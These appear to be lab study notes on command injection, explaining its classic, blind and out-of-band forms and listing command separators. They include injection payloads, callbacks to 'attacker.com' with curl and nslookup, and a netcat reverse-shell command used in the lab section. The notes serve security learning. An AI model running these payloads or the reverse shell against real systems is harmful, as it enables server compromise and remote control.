## What is Command Injection?

Command Injection is a vulnerability that allows an attacker to execute **operating system (OS) commands** on the server.

It occurs when an application passes **unsanitized user input** to a system command.

---

# Example

The application executes:

```bash
ping USER_INPUT
```

An attacker submits:

```bash
127.0.0.1; whoami
```

The server executes:

```bash
ping 127.0.0.1
whoami
```

As a result, the attacker can run arbitrary OS commands.

---

# Types of Command Injection

## 1. Classic Command Injection

The command executes, and the application returns the command output.

Example:

```bash
whoami
```

Response:

```text
www-data
```

The attacker can directly see the output.

---

## 2. Blind Command Injection

The command executes, but **the output is not displayed**.

The attacker confirms execution by observing side effects.

Example:

```bash
sleep 10
```

If the response is delayed by 10 seconds, the attacker knows the command was executed.

Other common techniques include:

- `ping`
    
- `nslookup`
    
- DNS callbacks
    
- HTTP callbacks
    

---

## 3. Out-of-Band (OAST) Command Injection

The application neither displays the output nor changes its response time.

Instead, the attacker forces the server to communicate with an external system they control.

Example:

```bash
nslookup attacker.com
```

or

```bash
curl http://attacker.com
```

If the attacker receives the DNS or HTTP request, they know the command was executed.

---

# Common Command Separators

Attackers often use command separators to inject additional commands.

Examples:

```text
;
&&
||
|
$
``
```

---

# Impact

Successful Command Injection may allow an attacker to:

- Execute arbitrary OS commands
    
- Read sensitive files
    
- Download or upload files
    
- Gain a reverse shell
    
- Escalate privileges
    
- Fully compromise the server
    

---

# Lab

## Method 1

Used the **semicolon (`;`)** to terminate the original command and execute a second command.

The second command established a reverse shell back to the attacker's machine.

```bash
nc -c bash 192.168.227.128 4444
```

![[Pasted image 20260428161322.png]]

---

## Method 2

If the application filters the semicolon (`;`), another separator such as the **pipe (`|`)** may be used depending on how the application executes commands.

![[Pasted image 20260428161559.png]]

---

# Difference Between `;` and `|`

## Semicolon (`;`)

The semicolon executes multiple commands sequentially.

The second command runs regardless of whether the first command succeeds or fails.

Example:

```bash
whoami; id
```

Execution flow:

1. Execute `whoami`
    
2. Execute `id`
    

Both commands are executed independently.

---

## Pipe (`|`)

The pipe sends the **output** of the first command as the **input** to the second command.

Example:

```bash
ls | wc -l
```

Execution flow:

- `ls` lists the directory contents.
    
- `wc -l` counts the number of lines received from `ls`.
    

Unlike the semicolon, the two commands are connected through a data stream.

---

## Notes

### Command Separators

Several command separators may be useful during Command Injection testing, depending on the operating system and filtering rules:

- `;` — Execute commands sequentially.
    
- `|` — Pass the output of one command to another.
    
- `&&` — Execute the second command only if the first succeeds.
    
- `||` — Execute the second command only if the first fails.
    
- `&` — Execute commands in the background (behavior depends on the operating system and shell).